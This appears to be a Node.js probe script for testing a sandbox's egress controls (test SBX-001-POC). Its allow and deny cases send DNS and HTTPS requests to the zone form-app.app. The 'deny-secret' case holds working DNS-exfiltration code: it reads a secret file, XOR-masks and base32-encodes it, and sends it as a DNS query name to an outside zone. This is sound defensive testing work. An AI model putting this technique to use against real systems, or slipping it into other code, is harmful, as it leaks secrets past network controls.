import { randomBytes, createHash } from "node:crypto";
import dgram from "node:dgram";
import { constants as fsConstants } from "node:fs";
import { open, readFile } from "node:fs/promises";
import { isIP } from "node:net";
import { resolve } from "node:path";
import { pathToFileURL } from "node:url";
import tls from "node:tls";

export const SCOPE_CONFIRMATION = "I_CONTROL_FORM_APP_APP_AND_AUTHORIZE_BOUNDED_DNS_ANALYTICS_TESTING";
export const ZONE_NAME = "form-app.app";
export const SECRET_FILE_PATH = "/tmp/sbx-001/operator-secret";

const QUERY_NONCE_PATTERN = /^[a-f0-9]{32}$/u;
const DNS_TIMEOUT_MIN_MS = 500;
const DNS_TIMEOUT_MAX_MS = 5_000;
const HTTPS_TIMEOUT_MAX_MS = 10_000;
const BASE32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

function sha256(value) {
  return createHash("sha256").update(value).digest("hex");
}

function assertPlainObject(value, name) {
  if (value === null || typeof value !== "object" || Array.isArray(value)) {
    throw new Error(`${name} must be an object`);
  }
  return value;
}

function assertString(value, name) {
  if (typeof value !== "string" || value.length === 0) throw new Error(`${name} must be a non-empty string`);
  return value;
}

function strictInteger(value, name, minimum, maximum) {
  if (!Number.isInteger(value) || value < minimum || value > maximum) {
    throw new Error(`${name} must be an integer from ${minimum} through ${maximum}`);
  }
  return value;
}

export function base32Encode(value) {
  let accumulator = 0;
  let availableBits = 0;
  let output = "";
  for (const byte of value) {
    accumulator = (accumulator << 8) | byte;
    availableBits += 8;
    while (availableBits >= 5) {
      availableBits -= 5;
      output += BASE32_ALPHABET[(accumulator >>> availableBits) & 31];
      accumulator &= (1 << availableBits) - 1;
    }
  }
  if (availableBits > 0) output += BASE32_ALPHABET[(accumulator << (5 - availableBits)) & 31];
  return output;
}

function normalizeDnsName(value) {
  const normalized = value.toLowerCase().replace(/\.+$/u, "");
  if (normalized.length === 0 || normalized.length > 253 || !/^[a-z0-9.-]+$/u.test(normalized)) {
    throw new Error("invalid query name");
  }
  const labels = normalized.split(".");
  if (labels.some((label) => label.length === 0 || label.length > 63 || !/^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/u.test(label))) {
    throw new Error("invalid query-name label");
  }
  return normalized;
}

export function publicQueryName(caseId, queryNonce) {
  if (!QUERY_NONCE_PATTERN.test(queryNonce)) throw new Error("invalid query nonce");
  if (caseId !== "allow-public" && caseId !== "deny-public") throw new Error("invalid public DNS case");
  return normalizeDnsName(`${caseId === "allow-public" ? "a" : "d"}${queryNonce}.sbx001.${ZONE_NAME}`);
}

export async function secretQueryName(secretFilePath, queryNonce, oneTimePadBase64) {
  if (secretFilePath !== SECRET_FILE_PATH) throw new Error("unexpected secret path");
  if (!QUERY_NONCE_PATTERN.test(queryNonce)) throw new Error("invalid query nonce");
  if (typeof oneTimePadBase64 !== "string" || !/^[A-Za-z0-9_-]{22}$/u.test(oneTimePadBase64)) {
    throw new Error("one-time pad must be one canonical 16-byte base64url value");
  }
  const oneTimePad = Buffer.from(oneTimePadBase64, "base64url");
  if (oneTimePad.byteLength !== 16 || oneTimePad.toString("base64url") !== oneTimePadBase64) {
    oneTimePad.fill(0);
    throw new Error("one-time pad is not canonical 16-byte base64url");
  }
  const noFollow = fsConstants.O_NOFOLLOW ?? 0;
  const handle = await open(secretFilePath, fsConstants.O_RDONLY | noFollow);
  let secret;
  let ciphertext;
  try {
    const metadata = await handle.stat();
    if (!metadata.isFile() || (metadata.mode & 0o777) !== 0o600 || metadata.size !== 16) {
      throw new Error("synthetic secret must be a mode-0600 regular file containing exactly 16 bytes");
    }
    secret = await handle.readFile();
    if (secret.byteLength !== metadata.size) throw new Error("synthetic secret changed while being read");
    ciphertext = Buffer.alloc(16);
    for (let index = 0; index < 16; index += 1) ciphertext[index] = secret[index] ^ oneTimePad[index];
    const encoded = base32Encode(ciphertext).toLowerCase();
    return {
      queryName: normalizeDnsName(`s${encoded}${queryNonce}.sbx001.${ZONE_NAME}`),
      secretByteLength: 16,
      transform: "xor-one-time-pad",
    };
  } finally {
    secret?.fill(0);
    ciphertext?.fill(0);
    oneTimePad.fill(0);
    await handle.close();
  }
}

export function parseResolverAddress(resolvConf) {
  if (typeof resolvConf !== "string" || resolvConf.length > 16_384) throw new Error("invalid resolv.conf contents");
  for (const rawLine of resolvConf.split(/\r?\n/u)) {
    const line = rawLine.replace(/#.*$/u, "").trim();
    const match = /^nameserver\s+(\S+)$/u.exec(line);
    if (match?.[1] && isIP(match[1]) !== 0) return match[1];
  }
  throw new Error("no IP nameserver found in /etc/resolv.conf");
}

export function buildDnsAQuery(queryName, transactionId) {
  const normalized = normalizeDnsName(queryName);
  strictInteger(transactionId, "transactionId", 0, 65_535);
  const labels = normalized.split(".");
  const encodedLabels = [];
  for (const label of labels) {
    const encoded = Buffer.from(label, "ascii");
    encodedLabels.push(Buffer.from([encoded.byteLength]), encoded);
  }
  const header = Buffer.alloc(12);
  header.writeUInt16BE(transactionId, 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);
  const questionTail = Buffer.alloc(5);
  questionTail.writeUInt8(0, 0);
  questionTail.writeUInt16BE(1, 1);
  questionTail.writeUInt16BE(1, 3);
  const packet = Buffer.concat([header, ...encodedLabels, questionTail]);
  if (packet.byteLength > 512) throw new Error("DNS query exceeds the classic UDP bound");
  return packet;
}

export async function sendDnsQueryOnce({ resolverAddress, resolverPort = 53, queryName, timeoutMs }) {
  if (isIP(resolverAddress) === 0) throw new Error("resolverAddress must be an IP address");
  strictInteger(resolverPort, "resolverPort", 1, 65_535);
  strictInteger(timeoutMs, "timeoutMs", DNS_TIMEOUT_MIN_MS, DNS_TIMEOUT_MAX_MS);
  const transactionId = randomBytes(2).readUInt16BE(0);
  const packet = buildDnsAQuery(queryName, transactionId);
  const socket = dgram.createSocket(isIP(resolverAddress) === 6 ? "udp6" : "udp4");
  const startedAt = new Date().toISOString();
  let timer;
  try {
    return await new Promise((resolvePromise) => {
      let finished = false;
      const finish = (result) => {
        if (finished) return;
        finished = true;
        if (timer) clearTimeout(timer);
        socket.close();
        resolvePromise({
          startedAt,
          completedAt: new Date().toISOString(),
          queryAttempts: 1,
          queryBytes: packet.byteLength,
          resolverFamily: isIP(resolverAddress),
          resolverPort,
          ...result,
        });
      };
      socket.once("error", (error) => finish({
        sendInvoked: true,
        datagramAcceptedByKernel: false,
        responseReceived: false,
        errorCode: typeof error.code === "string" ? error.code.slice(0, 64) : "UDP_ERROR",
      }));
      socket.once("message", (message) => {
        const responseTransactionId = message.byteLength >= 2 ? message.readUInt16BE(0) : -1;
        const flags = message.byteLength >= 4 ? message.readUInt16BE(2) : 0;
        finish({
          sendInvoked: true,
          datagramAcceptedByKernel: true,
          responseReceived: true,
          responseBytes: Math.min(message.byteLength, 65_535),
          transactionIdMatched: responseTransactionId === transactionId,
          responseCode: flags & 0x000f,
        });
      });
      timer = setTimeout(() => finish({
        sendInvoked: true,
        datagramAcceptedByKernel: true,
        responseReceived: false,
        timedOut: true,
      }), timeoutMs);
      socket.send(packet, resolverPort, resolverAddress, (error) => {
        if (error) finish({
          sendInvoked: true,
          datagramAcceptedByKernel: false,
          responseReceived: false,
          errorCode: typeof error.code === "string" ? error.code.slice(0, 64) : "UDP_SEND_ERROR",
        });
      });
    });
  } finally {
    packet.fill(0);
  }
}

export async function runHttpsControl({ endpointUrl, pinnedIPv4, timeoutMs }) {
  const endpoint = new URL(endpointUrl);
  if (endpoint.href !== `https://${ZONE_NAME}/` || endpoint.port || endpoint.username || endpoint.password) {
    throw new Error("HTTPS control endpoint must be the exact owned zone apex");
  }
  if (isIP(pinnedIPv4) !== 4) throw new Error("HTTPS control pin must be an IPv4 address");
  strictInteger(timeoutMs, "timeoutMs", 500, HTTPS_TIMEOUT_MAX_MS);
  const startedAt = new Date().toISOString();
  return await new Promise((resolvePromise) => {
    let finished = false;
    let received = Buffer.alloc(0);
    const socket = tls.connect({
      host: pinnedIPv4,
      port: 443,
      servername: endpoint.hostname,
      rejectUnauthorized: true,
      ALPNProtocols: ["http/1.1"],
      timeout: timeoutMs,
    });
    const finish = (result) => {
      if (finished) return;
      finished = true;
      socket.destroy();
      received.fill(0);
      received = Buffer.alloc(0);
      resolvePromise({
        startedAt,
        completedAt: new Date().toISOString(),
        connectionAttempts: 1,
        endpointHostname: endpoint.hostname,
        pinnedIPv4,
        pinnedPort: 443,
        redirectsFollowed: 0,
        ...result,
      });
    };
    socket.once("secureConnect", () => {
      const request = Buffer.from(`HEAD / HTTP/1.1\r\nHost: ${endpoint.hostname}\r\nConnection: close\r\nUser-Agent: sbx-001-control\r\n\r\n`, "ascii");
      socket.write(request, () => request.fill(0));
    });
    socket.on("data", (chunk) => {
      if (received.byteLength >= 2_048) return;
      received = Buffer.concat([received, chunk.subarray(0, 2_048 - received.byteLength)]);
      const headerEnd = received.indexOf("\r\n\r\n");
      if (headerEnd === -1) return;
      const statusLine = received.subarray(0, received.indexOf("\r\n")).toString("ascii");
      const match = /^HTTP\/1\.[01] ([1-5][0-9]{2})(?: |$)/u.exec(statusLine);
      finish({
        tlsVerified: socket.authorized === true,
        alpnProtocol: socket.alpnProtocol || "",
        responseReceived: match !== null,
        statusCode: match ? Number(match[1]) : undefined,
        peerAddress: socket.remoteAddress,
      });
    });
    socket.once("timeout", () => finish({ tlsVerified: false, responseReceived: false, errorCode: "ETIMEDOUT" }));
    socket.once("error", (error) => finish({
      tlsVerified: false,
      responseReceived: false,
      errorCode: typeof error.code === "string" ? error.code.slice(0, 64) : "TLS_ERROR",
    }));
    socket.once("end", () => {
      if (!finished) finish({ tlsVerified: socket.authorized === true, responseReceived: false, errorCode: "EARLY_EOF" });
    });
  });
}

export function parseConfiguration(encoded) {
  if (typeof encoded !== "string" || encoded.length === 0 || encoded.length > 16_384) {
    throw new Error("configuration must be one bounded base64url argument");
  }
  let parsed;
  try {
    parsed = JSON.parse(Buffer.from(encoded, "base64url").toString("utf8"));
  } catch {
    throw new Error("configuration is not valid base64url JSON");
  }
  const config = assertPlainObject(parsed, "configuration");
  if (config.scopeConfirmation !== SCOPE_CONFIRMATION) throw new Error("scope confirmation mismatch");
  if (config.zoneName !== ZONE_NAME) throw new Error("unexpected DNS zone");
  if (!QUERY_NONCE_PATTERN.test(config.queryNonce)) throw new Error("invalid query nonce");
  if (typeof config.runId !== "string" || !/^[a-f0-9-]{36}$/u.test(config.runId)) throw new Error("invalid run ID");
  if (config.testId !== "SBX-001-POC") throw new Error("unexpected test ID");

  if (config.mode === "dns") {
    if (!["allow-public", "deny-public", "deny-secret"].includes(config.caseId)) throw new Error("unexpected DNS case");
    const allowedKeys = new Set([
      "scopeConfirmation", "zoneName", "queryNonce", "runId", "testId", "mode", "caseId", "timeoutMs", "secretFilePath", "oneTimePadBase64",
    ]);
    if (Object.keys(config).some((key) => !allowedKeys.has(key))) throw new Error("unexpected DNS configuration field");
    strictInteger(config.timeoutMs, "timeoutMs", DNS_TIMEOUT_MIN_MS, DNS_TIMEOUT_MAX_MS);
    if (config.caseId === "deny-secret") {
      if (config.secretFilePath !== SECRET_FILE_PATH) throw new Error("deny-secret requires the fixed secret path");
      if (typeof config.oneTimePadBase64 !== "string" || !/^[A-Za-z0-9_-]{22}$/u.test(config.oneTimePadBase64)) {
        throw new Error("deny-secret requires one canonical 16-byte base64url pad");
      }
    } else if (config.secretFilePath !== undefined || config.oneTimePadBase64 !== undefined) {
      throw new Error("public DNS cases must not receive secret material");
    }
    return config;
  }

  if (config.mode === "https-control") {
    if (config.caseId !== "allow-https-control" && config.caseId !== "deny-https-control") {
      throw new Error("unexpected HTTPS control case");
    }
    const allowedKeys = new Set([
      "scopeConfirmation", "zoneName", "queryNonce", "runId", "testId", "mode", "caseId", "timeoutMs", "endpointUrl", "pinnedIPv4",
    ]);
    if (Object.keys(config).some((key) => !allowedKeys.has(key))) throw new Error("unexpected HTTPS configuration field");
    strictInteger(config.timeoutMs, "timeoutMs", 500, HTTPS_TIMEOUT_MAX_MS);
    assertString(config.endpointUrl, "endpointUrl");
    assertString(config.pinnedIPv4, "pinnedIPv4");
    return config;
  }
  throw new Error("unsupported probe mode");
}

async function main() {
  let configuration;
  try {
    configuration = parseConfiguration(process.argv[2]);
    if (configuration.mode === "https-control") {
      const result = await runHttpsControl(configuration);
      process.stdout.write(`${JSON.stringify({
        ok: true,
        mode: configuration.mode,
        runId: configuration.runId,
        testId: configuration.testId,
        caseId: configuration.caseId,
        ...result,
      })}\n`);
      return;
    }

    let query;
    if (configuration.caseId === "deny-secret") {
      query = await secretQueryName(
        configuration.secretFilePath,
        configuration.queryNonce,
        configuration.oneTimePadBase64,
      );
    } else {
      const queryName = publicQueryName(configuration.caseId, configuration.queryNonce);
      query = {
        queryName,
        secretByteLength: undefined,
        transform: undefined,
      };
    }
    const resolverAddress = parseResolverAddress(await readFile("/etc/resolv.conf", "utf8"));
    const queryNameSha256 = sha256(query.queryName);
    const result = await sendDnsQueryOnce({
      resolverAddress,
      queryName: query.queryName,
      timeoutMs: configuration.timeoutMs,
    });
    process.stdout.write(`${JSON.stringify({
      ok: true,
      mode: configuration.mode,
      runId: configuration.runId,
      testId: configuration.testId,
      caseId: configuration.caseId,
      queryType: "A",
      queryNameSha256,
      ...(query.transform ? {
        secretByteLength: query.secretByteLength,
        transform: query.transform,
      } : {}),
      ...result,
    })}\n`);
  } catch (error) {
    process.stdout.write(`${JSON.stringify({
      ok: false,
      phase: configuration ? "execution" : "configuration",
      errorCode: error instanceof Error ? error.name.slice(0, 64) : "UNKNOWN_ERROR",
    })}\n`);
    process.exitCode = 1;
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(resolve(process.argv[1])).href) {
  await main();
}
